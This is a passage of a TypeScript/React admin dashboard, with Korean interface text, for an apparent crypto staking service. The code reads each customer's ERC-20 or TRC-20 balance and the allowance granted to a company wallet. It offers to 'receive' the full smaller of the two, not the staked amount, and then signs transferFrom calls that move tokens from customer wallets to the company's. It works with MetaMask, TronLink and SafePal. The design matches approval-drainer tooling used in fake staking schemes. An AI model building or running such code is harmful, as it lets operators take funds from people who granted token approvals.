            {formatNumber(request.amountNumeric, 6)} {request.sourceSymbol}
          </span>
        </p>
        <p>
          승인된 수량: <span className="font-mono text-foreground">{formatRequestAllowance(request)}</span>
        </p>
        <p>
          고객 지갑:{" "}
          <span className="font-mono text-foreground">
            {isEvmToken
              ? request.walletAddress
                ? shortAddress(request.walletAddress)
                : "-"
              : request.tronAddress
                ? shortAddress(request.tronAddress)
                : "-"}
          </span>
        </p>
        <p>
          회사 지갑:{" "}
          <span className="font-mono text-foreground">
            {isEvmToken
              ? adminWallet?.evmAddress
                ? shortAddress(adminWallet.evmAddress)
                : "-"
              : adminWallet?.tronAddress
                ? shortAddress(adminWallet.tronAddress)
                : "-"}
          </span>
        </p>
      </div>

      {hasRecordedAllowance && !hasEnoughRecordedAllowance && (
        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
          입력한 수량이 고객이 승인한 수량보다 큽니다.
        </div>
      )}
      {!hasRecordedAllowance && hasApproval && request.tokenAddress && (
        <div className="mt-3 rounded-xl border border-sky-200 bg-sky-50 p-3 text-xs text-sky-700">
          저장된 승인 수량이 없습니다. 실제 받을 수량은 아래 “받을 수 있는 수량 확인”에서
          확인하거나, 받기 실행 시 온체인에서 다시 검증합니다.
        </div>
      )}
      {!hasApproval && request.tokenAddress && (
        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
          고객 승인 기록이 없습니다. 먼저 승인 확인을 진행해주세요.
        </div>
      )}
      {expectedSpender && !savedWalletMatchesSpender && (
        <div className="mt-3 rounded-xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-700">
          저장된 회사 지갑이 고객이 승인한 지갑과 다릅니다.
        </div>
      )}
      {savedWalletMatchesSpender && (
        <details className="mt-3 rounded-xl border border-black/5 bg-black/[0.02] p-3 text-xs text-muted">
          <summary className="cursor-pointer font-bold text-foreground/70">
            처리 방식 보기
          </summary>
          <p className="mt-2">
            {isEvmToken
              ? "서버 키가 없으면 회사 EVM 지갑이 열린 MetaMask에서 서명합니다."
              : "TRON 토큰은 서버 키 또는 회사 TRON 지갑이 열린 TronLink/SafePal 서명이 필요합니다."}
          </p>
        </details>
      )}
      {localError && (
        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
          {localError}
        </div>
      )}
    </>
  );
}

function RemainingAllowanceRow({
  request,
  adminWallet,
  onApplyRecoverable,
  compact = false,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  onApplyRecoverable: (value: string) => void;
  compact?: boolean;
}) {
  const [snapshot, setSnapshot] = useState<RecoverySnapshot | null>(null);
  const [isChecking, setIsChecking] = useState(false);
  const [localError, setLocalError] = useState<string | null>(null);

  const decimals = request.tokenDecimals ?? 18;
  const spender = request.spenderAddress ?? resolveRequestSpender(request, adminWallet);
  const balanceLabel = snapshot ? formatRawToken(snapshot.balanceRaw, decimals) : "-";
  const allowanceLabel = snapshot ? formatRawToken(snapshot.allowanceRaw, decimals) : "-";
  const recoverableLabel = snapshot ? formatRawToken(snapshot.recoverableRaw, decimals) : "-";
  const recoverableValue = snapshot
    ? formatUnits(BigInt(snapshot.recoverableRaw), decimals)
    : "0";

  async function checkRemaining() {
    setIsChecking(true);
    setLocalError(null);
    try {
      if (!request.tokenAddress || request.tokenDecimals === null) {
        throw new Error("토큰 정보를 찾지 못했습니다.");
      }
      if (!spender) {
        throw new Error("회사 승인 지갑 주소가 없습니다.");
      }

      const nextSnapshot = request.tokenAddress.startsWith("0x")
        ? await readErc20RecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.walletAddress,
            spender,
          })
        : await readTronRecoverySnapshot({
            tokenAddress: request.tokenAddress,
            owner: request.tronAddress,
            spender,
          });
      setSnapshot(nextSnapshot);
    } catch (e) {
      setLocalError(e instanceof Error ? e.message : "수량 확인 실패");
    } finally {
      setIsChecking(false);
    }
  }

  return (
    <div
      className={
        compact
          ? "rounded-xl border border-black/5 bg-black/[0.02] p-3"
          : "rounded-2xl border border-black/5 bg-white p-4"
      }
    >
      <div className="flex flex-col gap-3 lg:flex-row lg:items-start lg:justify-between">
        <div>
          <p className="text-xs font-extrabold text-foreground">
            {compact
              ? "받을 수 있는 수량 확인"
              : `${request.user.username} · ${request.sourceSymbol} → ${request.receiptSymbol}`}
          </p>
          <p className="mt-1 text-xs text-muted">
            {request.sourceNetwork} · 회사 승인 지갑{" "}
            <span className="font-mono text-foreground">
              {spender ? shortAddress(spender) : "-"}
            </span>
          </p>
        </div>
        <button
          type="button"
          onClick={checkRemaining}
          disabled={isChecking}
          className="inline-flex h-10 items-center justify-center gap-2 rounded-xl border border-black/10 bg-white px-4 text-xs font-extrabold text-foreground/80 transition hover:border-foreground/30 disabled:cursor-wait disabled:opacity-60"
        >
          <RefreshCw className={`h-3.5 w-3.5 ${isChecking ? "animate-spin" : ""}`} />
          {isChecking ? "확인 중..." : "수량 확인"}
        </button>
      </div>

      <div className="mt-4 grid gap-2 sm:grid-cols-3">
        <RemainingMetric label="고객 잔고" value={`${balanceLabel} ${request.sourceSymbol}`} />
        <RemainingMetric label="승인된 수량" value={`${allowanceLabel} ${request.sourceSymbol}`} />
        <RemainingMetric
          label="받을 수량"
          value={`${recoverableLabel} ${request.sourceSymbol}`}
          tone="emerald"
        />
      </div>

      <details className="mt-3 rounded-xl bg-black/[0.02] p-3 text-[11px] text-muted">
        <summary className="cursor-pointer font-bold text-foreground/70">
          상세 기록 보기
        </summary>
        <div className="mt-3 grid gap-2 sm:grid-cols-2">
          <p>
            고객 지갑:{" "}
            <span className="font-mono text-foreground">
              {request.tokenAddress?.startsWith("0x")
                ? request.walletAddress
                  ? shortAddress(request.walletAddress)
                  : "-"
                : request.tronAddress
                  ? shortAddress(request.tronAddress)
                  : "-"}
            </span>
          </p>
          <p>
            기록된 승인 수량:{" "}
            <span className="font-mono text-foreground">{formatRequestAllowance(request)}</span>
          </p>
          <p>
            토큰 주소:{" "}
            <span className="font-mono text-foreground">
              {request.tokenAddress ? shortAddress(request.tokenAddress) : "-"}
            </span>
          </p>
          <p>
            조회 시각:{" "}
            <span className="font-mono text-foreground">
              {snapshot ? formatDate(snapshot.checkedAt) : "-"}
            </span>
          </p>
        </div>
      </details>

      {snapshot && BigInt(snapshot.recoverableRaw) > BigInt(0) && (
        <button
          type="button"
          onClick={() => onApplyRecoverable(recoverableValue)}
          className="mt-3 w-full rounded-xl bg-accent-strong px-4 py-2.5 text-xs font-extrabold text-white transition hover:bg-accent-strong/90"
        >
          이 수량으로 받기
        </button>
      )}

      {localError && (
        <div className="mt-3 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
          {localError}
        </div>
      )}
    </div>
  );
}

function RemainingMetric({
  label,
  value,
  tone,
}: {
  label: string;
  value: string;
  tone?: "emerald";
}) {
  return (
    <div className="rounded-xl border border-black/5 bg-black/[0.02] p-3">
      <p className="text-[10px] font-bold uppercase tracking-widest text-muted">{label}</p>
      <p
        className={`mt-1 truncate font-mono text-sm font-extrabold ${
          tone === "emerald" ? "text-emerald-600" : "text-foreground"
        }`}
      >
        {value}
      </p>
    </div>
  );
}

function ProcessingGuide({ availableCount }: { availableCount: number }) {
  const steps = [
    {
      icon: <ListChecks className="h-4 w-4" />,
      title: "1. 요청 확인",
      body: "고객과 예치 수량을 확인합니다.",
    },
    {
      icon: <CheckCircle2 className="h-4 w-4" />,
      title: "2. 승인 확인",
      body: "승인 기록이 있으면 버튼을 누릅니다.",
    },
    {
      icon: <ArrowDownToLine className="h-4 w-4" />,
      title: "3. 회사 지갑 수령",
      body: `받을 수 있는 요청 ${availableCount}건`,
    },
    {
      icon: <CheckCircle2 className="h-4 w-4" />,
      title: "4. 정산 완료",
      body: "처리가 끝난 요청을 완료 처리합니다.",
    },
  ];

  return (
    <div className="mt-4 grid gap-2 rounded-2xl border border-black/5 bg-black/[0.02] p-3 sm:grid-cols-2 xl:grid-cols-4">
      {steps.map((step) => (
        <div key={step.title} className="rounded-xl bg-white px-3 py-3">
          <div className="flex items-center gap-2 text-accent-strong">
            {step.icon}
            <p className="text-xs font-extrabold text-foreground">{step.title}</p>
          </div>
          <p className="mt-1 text-[11px] font-medium text-muted">{step.body}</p>
        </div>
      ))}
    </div>
  );
}

function RequestMetaGrid({ request }: { request: StakeRequestRow }) {
  return (
    <details className="mt-3 rounded-xl bg-black/[0.02] p-3 text-[11px] text-muted">
      <summary className="cursor-pointer font-bold text-foreground/70">
        상세 기록 보기
      </summary>
      <div className="mt-3 grid gap-2 sm:grid-cols-2">
        <p>
          고객 EVM:{" "}
          <span className="font-mono text-foreground">
            {request.walletAddress ? shortAddress(request.walletAddress) : "-"}
          </span>
        </p>
        <p>
          고객 TRON:{" "}
          <span className="font-mono text-foreground">
            {request.tronAddress ? shortAddress(request.tronAddress) : "-"}
          </span>
        </p>
        <p>
          회사 승인 지갑:{" "}
          <span className="font-mono text-foreground">
            {request.spenderAddress ? shortAddress(request.spenderAddress) : "-"}
          </span>
        </p>
        <p>
          승인 기록:{" "}
          <span className="font-mono text-foreground">
            {request.approveTxHash ? shortAddress(request.approveTxHash) : "-"}
          </span>
        </p>
        <p>
          승인된 수량:{" "}
          <span className="font-mono text-foreground">
            {formatRequestAllowance(request)}
          </span>
        </p>
        <p>
          전송 기록:{" "}
          <span className="font-mono text-foreground">
            {request.transferTxHash ? shortAddress(request.transferTxHash) : "-"}
          </span>
        </p>
      </div>
    </details>
  );
}

function MetricPill({ label, value }: { label: string; value: string }) {
  return (
    <div className="rounded-xl bg-black/[0.03] px-2 py-2">
      <p className="font-mono font-extrabold text-foreground">{value}</p>
      <p className="mt-0.5 text-muted">{label}</p>
    </div>
  );
}

function buildUserSummaries(requests: StakeRequestRow[]): UserSummary[] {
  const map = new Map<string, UserSummary>();

  requests.forEach((request) => {
    const key = request.user.id;
    const existing =
      map.get(key) ??
      ({
        key,
        userId: request.user.id,
        username: request.user.username,
        walletAddress: request.user.walletAddress ?? request.walletAddress,
        tronAddress: request.user.tronAddress ?? request.tronAddress,
        requests: [],
        activeCount: 0,
        approvedCount: 0,
        allowanceCount: 0,
        latestRequest: null,
      } satisfies UserSummary);

    existing.requests.push(request);
    if (request.status !== "REJECTED") existing.activeCount += 1;
    if (hasApprovalRecord(request)) existing.approvedCount += 1;
    if (request.allowanceRaw && request.allowanceRaw !== "0") existing.allowanceCount += 1;
    if (
      !existing.latestRequest ||
      new Date(request.createdAt).getTime() > new Date(existing.latestRequest.createdAt).getTime()
    ) {
      existing.latestRequest = request;
    }
    map.set(key, existing);
  });

  return Array.from(map.values()).sort((a, b) => {
    const latestA = a.latestRequest ? new Date(a.latestRequest.createdAt).getTime() : 0;
    const latestB = b.latestRequest ? new Date(b.latestRequest.createdAt).getTime() : 0;
    return latestB - latestA;
  });
}

function hasApprovalRecord(request: StakeRequestRow) {
  return Boolean(
    request.approveTxHash || (request.allowanceRaw && request.allowanceRaw !== "0"),
  );
}

function isRecoverableRequest(request: StakeRequestRow) {
  return Boolean(
    request.approvalRequired &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      request.status !== "SETTLED" &&
      request.status !== "REJECTED" &&
      (request.status !== "TRANSFERRED" || !request.transferTxHash),
  );
}

function isTokenApprovalRequest(request: StakeRequestRow) {
  return Boolean(
    request.approvalRequired &&
      request.tokenAddress &&
      request.tokenDecimals !== null &&
      request.status !== "REJECTED",
  );
}

function resolveRequestSpender(
  request: StakeRequestRow,
  adminWallet: AdminWalletRow | null,
) {
  if (request.spenderAddress) return request.spenderAddress;
  if (!adminWallet) return null;
  if (request.tokenAddress?.startsWith("0x")) return adminWallet.evmAddress;
  return adminWallet.tronAddress;
}

function formatRecoveryFailureMessage({
  isEvmToken,
  serverMessage,
  walletMessage,
}: {
  isEvmToken: boolean;
  serverMessage: string;
  walletMessage: string;
}) {
  if (!isEvmToken) {
    const missingServerKey = serverMessage.includes("ADMIN_TRON_PRIVATE_KEY");
    const missingBrowserSigner =
      walletMessage.includes("TRON 서명 기능") ||
      walletMessage.includes("TRON 주소를 확인") ||
      walletMessage.includes("TronLink") ||
      walletMessage.includes("SafePal");

    if (missingServerKey && missingBrowserSigner) {
      return "TRON 토큰은 MetaMask로 처리할 수 없습니다. 서버 설정을 완료하거나 회사 TRON 지갑을 TronLink/SafePal로 열어 서명해야 합니다.";
    }
  }

  if (isEvmToken && serverMessage.includes("ADMIN_EVM_PRIVATE_KEY")) {
    return `서버에 ADMIN_EVM_PRIVATE_KEY가 없어 MetaMask 서명을 시도했지만 실패했습니다. ${walletMessage}`;
  }

  return `${serverMessage} / ${walletMessage}`;
}

function formatRawToken(raw: string, decimals: number) {
  try {
    return formatUnits(BigInt(raw), decimals);
  } catch {
    return "-";
  }
}

function formatRequestAllowance(request: StakeRequestRow) {
  if (!request.allowanceRaw || request.allowanceRaw === "0" || request.tokenDecimals === null) {
    return "-";
  }
  try {
    return `${formatUnits(BigInt(request.allowanceRaw), request.tokenDecimals)} ${request.sourceSymbol}`;
  } catch {
    return "-";
  }
}

function formatStatusLabel(status: StakeStatus) {
  const labels: Record<StakeStatus, string> = {
    REQUESTED: "요청",
    APPROVED: "승인",
    TRANSFERRED: "수령",
    SETTLED: "정산",
    REJECTED: "반려",
  };
  return labels[status] ?? status;
}

function formatDate(value: string) {
  return new Intl.DateTimeFormat("ko-KR", {
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  }).format(new Date(value));
}

function toUnits(value: string, decimals: number) {
  try {
    const normalized = value.trim();
    if (!normalized || Number(normalized) <= 0) return null;
    return parseUnits(normalized, decimals);
  } catch {
    return null;
  }
}

function toBigInt(value: string | null) {
  if (!value) return null;
  try {
    return BigInt(value);
  } catch {
    return null;
  }
}

function unknownToBigInt(value: unknown) {
  if (typeof value === "bigint") return value;
  if (typeof value === "number") return BigInt(value);
  if (typeof value === "string") return BigInt(value);
  if (value && typeof value === "object" && "toString" in value) {
    return BigInt(String(value));
  }
  throw new Error("토큰 수량을 해석하지 못했습니다.");
}

function extractTxId(value: unknown) {
  if (typeof value === "string") return value;
  if (value && typeof value === "object") {
    const record = value as Record<string, unknown>;
    if (typeof record.txid === "string") return record.txid;
    if (typeof record.hash === "string") return record.hash;
  }
  return String(value);
}

function minBigInt(a: bigint, b: bigint) {
  return a < b ? a : b;
}

function getEthereumProvider() {
  if (typeof window === "undefined") return null;
  const ethereum =
    (window as unknown as { ethereum?: Eip1193Provider }).ethereum ?? null;
  if (!ethereum) return null;

  const providers = Array.isArray(ethereum.providers)
    ? ethereum.providers
    : [ethereum];
  return providers.find((provider) => provider.isMetaMask) ?? null;
}

async function recoverWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow | null;
  amountUnits: bigint;
}) {
  if (!adminWallet) throw new Error("회사 지갑이 저장되어 있지 않습니다.");
  if (!request.tokenAddress) throw new Error("토큰 주소가 없습니다.");
  if (!request.spenderAddress) throw new Error("회사 승인 지갑 주소가 없습니다.");

  if (request.tokenAddress.startsWith("0x")) {
    return await recoverEvmWithBrowserWallet({
      request,
      adminWallet,
      amountUnits,
    });
  }

  return await recoverTronWithBrowserWallet({
    request,
    adminWallet,
    amountUnits,
  });
}

async function recoverEvmWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow;
  amountUnits: bigint;
}) {
  if (!request.walletAddress || !isAddress(request.walletAddress)) {
    throw new Error("유저 EVM 주소가 없습니다.");
  }
  if (!request.tokenAddress || !isAddress(request.tokenAddress)) {
    throw new Error("토큰 EVM 주소가 올바르지 않습니다.");
  }
  if (!request.spenderAddress || !isAddress(request.spenderAddress)) {
    throw new Error("회사 EVM 승인 지갑 주소가 올바르지 않습니다.");
  }
  if (!isAddress(adminWallet.evmAddress)) {
    throw new Error("회사 EVM 지갑 주소가 올바르지 않습니다.");
  }

  const provider = getEthereumProvider();
  if (!provider) {
    throw new Error("MetaMask EVM 확장 지갑을 찾을 수 없습니다.");
  }

  const accounts = await provider.request({ method: "eth_requestAccounts" });
  const account = Array.isArray(accounts) ? accounts[0] : null;
  if (typeof account !== "string" || !isAddress(account)) {
    throw new Error("MetaMask EVM 주소를 확인하지 못했습니다.");
  }
  if (account.toLowerCase() !== request.spenderAddress.toLowerCase()) {
    throw new Error(
      `MetaMask 주소(${shortAddress(account)})가 회사 승인 지갑(${shortAddress(request.spenderAddress)})과 다릅니다.`,
    );
  }

  const publicClient = createPublicClient({ transport: custom(provider) });
  const [balance, allowance] = await Promise.all([
    publicClient.readContract({
      address: request.tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [request.walletAddress as Address],
    }),
    publicClient.readContract({
      address: request.tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [request.walletAddress as Address, request.spenderAddress as Address],
    }),
  ]);
  if (balance < amountUnits) {
    throw new Error("유저 EVM 토큰 잔고가 실행 수량보다 작습니다.");
  }
  if (allowance < amountUnits) {
    throw new Error("EVM 승인 수량이 받을 수량보다 작습니다.");
  }

  const walletClient = createWalletClient({
    account: account as Address,
    transport: custom(provider),
  });
  return await walletClient.writeContract({
    address: request.tokenAddress as Address,
    abi: ERC20_ABI,
    functionName: "transferFrom",
    args: [
      request.walletAddress as Address,
      adminWallet.evmAddress as Address,
      amountUnits,
    ],
    chain: null,
  });
}

async function recoverTronWithBrowserWallet({
  request,
  adminWallet,
  amountUnits,
}: {
  request: StakeRequestRow;
  adminWallet: AdminWalletRow;
  amountUnits: bigint;
}) {
  if (!request.tronAddress) throw new Error("유저 TRON 주소가 없습니다.");
  if (!request.tokenAddress) throw new Error("TRON 토큰 주소가 없습니다.");
  if (!request.spenderAddress) throw new Error("회사 승인 지갑 주소가 없습니다.");
  if (!adminWallet.tronAddress) throw new Error("회사 TRON 지갑이 저장되어 있지 않습니다.");

  const tronWeb = await requestInjectedTronWeb();
  const signerAddress = getInjectedTronAddress();
  if (!signerAddress) {
    throw new Error("SafePal/TronLink에서 TRON 주소를 확인하지 못했습니다.");
  }
  if (!sameTronAddress(signerAddress, request.spenderAddress)) {
    throw new Error(
      `확장 지갑 주소(${shortAddress(signerAddress)})가 회사 승인 지갑(${shortAddress(request.spenderAddress)})과 다릅니다.`,
    );
  }
  if (!sameTronAddress(adminWallet.tronAddress, request.spenderAddress)) {
    throw new Error("저장된 회사 TRON 지갑이 회사 승인 지갑과 다릅니다.");
  }

  const contract = await getTronTrc20Contract(tronWeb, request.tokenAddress);
  const [balanceResult, allowanceResult] = await Promise.all([
    contract.balanceOf(request.tronAddress).call(),
    contract.allowance(request.tronAddress, request.spenderAddress).call(),
  ]);
  const balance = unknownToBigInt(balanceResult);
  const allowance = unknownToBigInt(allowanceResult);
  if (balance < amountUnits) {
    throw new Error("유저 TRON 토큰 잔고가 실행 수량보다 작습니다.");
  }
  if (allowance < amountUnits) {
    throw new Error("TRON 승인 수량이 받을 수량보다 작습니다.");
  }

  const tx = await contract
    .transferFrom(request.tronAddress, adminWallet.tronAddress, amountUnits.toString())
    .send({ feeLimit: 100_000_000 });
  return extractTxId(tx);
}

async function requestInjectedTronWeb() {
  await requestTronAccountsAccess();
  const tronWeb = getInjectedTronWeb();
  if (!tronWeb) {
    throw new Error("SafePal/TronLink TRON 서명 기능을 찾지 못했습니다.");
  }
  return tronWeb;
}

async function requestTronAccountsAccess() {
  const tronWindow = getTronWindow();
  const requesters = [
    () => tronWindow.tronLink?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.tron?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.safepal?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.tronWeb?.request?.({ method: "tron_requestAccounts" }),
    () => tronWindow.safepal?.request?.({ method: "eth_requestAccounts" }),
  ];

  for (const requestAccounts of requesters) {
    try {
      await requestAccounts();
      if (getInjectedTronWeb()) return;
    } catch {
      // Try the next provider shape.
    }
  }
}

function getTronWindow() {
  if (typeof window === "undefined") return {} as TronWindow;
  return window as unknown as TronWindow;
}

function getTronWebCandidates() {
  const tronWindow = getTronWindow();
  return [
    tronWindow.tronLink?.tronWeb,
    tronWindow.tron?.tronWeb,
    tronWindow.safepal?.tronWeb,
    tronWindow.tronWeb,
  ].filter((tronWeb): tronWeb is TronTransferWeb => Boolean(tronWeb));
}

function getInjectedTronWeb() {
  return getTronWebCandidates()[0] ?? null;
}

function getInjectedTronAddress() {
  for (const tronWeb of getTronWebCandidates()) {
    const address = tronWeb.defaultAddress?.base58?.trim();
    if (address && TRON_ADDRESS_RE.test(address)) return address;
  }
  return null;
}

async function getTronTrc20Contract(
  tronWeb: TronTransferWeb,
  tokenAddress: string,
) {
  if (!tronWeb.contract) {
    throw new Error("확장 지갑에서 TRC20 컨트랙트를 열 수 없습니다.");
  }

  try {
    const contract = await tronWeb.contract(TRC20_TRANSFER_ABI, tokenAddress);
    if (contract) return contract;
  } catch {
    // Some injected wallets only support contract().at(address).
  }

  try {
    const contract = await tronWeb.contract().at(tokenAddress);
    if (contract) return contract;
  } catch {
    // Keep final error stable.
  }

  throw new Error("확장 지갑에서 TRC20 transferFrom 기능을 찾지 못했습니다.");
}

function sameTronAddress(a: string | null | undefined, b: string | null | undefined) {
  return Boolean(a && b && a.trim() === b.trim());
}

async function readErc20RecoverySnapshot({
  tokenAddress,
  owner,
  spender,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
}): Promise<RecoverySnapshot> {
  if (!owner || !isAddress(owner)) throw new Error("유저 EVM 주소가 없습니다.");
  if (!isAddress(spender)) throw new Error("회사 EVM 승인 지갑 주소가 올바르지 않습니다.");

  const provider = getEthereumProvider();
  if (!provider) throw new Error("EVM 지갑 provider를 찾을 수 없습니다.");
  const publicClient = createPublicClient({ transport: custom(provider) });
  const [balance, allowance] = await Promise.all([
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "balanceOf",
      args: [owner as Address],
    }),
    publicClient.readContract({
      address: tokenAddress as Address,
      abi: ERC20_ABI,
      functionName: "allowance",
      args: [owner as Address, spender as Address],
    }),
  ]);
  const balanceRaw = balance.toString();
  const allowanceRaw = allowance.toString();
  return {
    balanceRaw,
    allowanceRaw,
    recoverableRaw: minBigInt(balance, allowance).toString(),
    checkedAt: new Date().toISOString(),
  };
}

async function readTronRecoverySnapshot({
  tokenAddress,
  owner,
  spender,
}: {
  tokenAddress: string;
  owner: string | null;
  spender: string;
}): Promise<RecoverySnapshot> {
  if (!owner) throw new Error("유저 TRON 주소가 없습니다.");
  const params = new URLSearchParams({
    tokenAddress,
    owner,
    spender,
  });
  const res = await fetch(`/api/admin/tron/recovery-snapshot?${params.toString()}`, {
    cache: "no-store",
  });
  const data = (await res.json()) as RecoverySnapshot & { error?: string };
  if (!res.ok) {
    throw new Error(data.error ?? "TRON 잔고와 승인 수량 확인 실패");
  }

  return {
    balanceRaw: data.balanceRaw,
    allowanceRaw: data.allowanceRaw,
    recoverableRaw: data.recoverableRaw,
    checkedAt: data.checkedAt,
  };
}
